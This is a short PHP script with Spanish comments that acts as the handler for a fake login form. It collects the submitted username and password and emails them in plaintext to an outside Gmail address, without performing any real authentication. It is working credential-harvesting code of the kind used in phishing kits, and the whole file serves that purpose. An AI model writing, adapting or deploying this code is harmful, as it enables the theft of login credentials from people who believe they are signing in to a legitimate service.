<?php
// Configuración: dirección de correo donde se enviarán los datos
$destinatario = 'rafagonzacara123@gmail.com';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Validación y sanitización de los datos ingresados
    $usuario = htmlspecialchars($_POST['username']);
    $contrasena = htmlspecialchars($_POST['password']);
    
    // Crea el contenido del mensaje
    $asunto = "Información de inicio de sesión";
    $mensaje = "Se ha intentado iniciar sesión con las siguientes credenciales:\n";
    $mensaje .= "Usuario: " . $usuario . "\n";
    $mensaje .= "Contraseña: " . $contrasena . "\n";
    
    // Encabezados del correo
    $headers = "From: no-reply@tudominio.com\r\n";
    $headers .= "Reply-To: no-reply@tudominio.com\r\n";
    
    // Envía el correo electrónico y muestra el resultado
    if (mail($destinatario, $asunto, $mensaje, $headers)) {
        echo "La información fue enviada correctamente.";
    } else {
        echo "Hubo un error al enviar la información.";
    }
}
?>
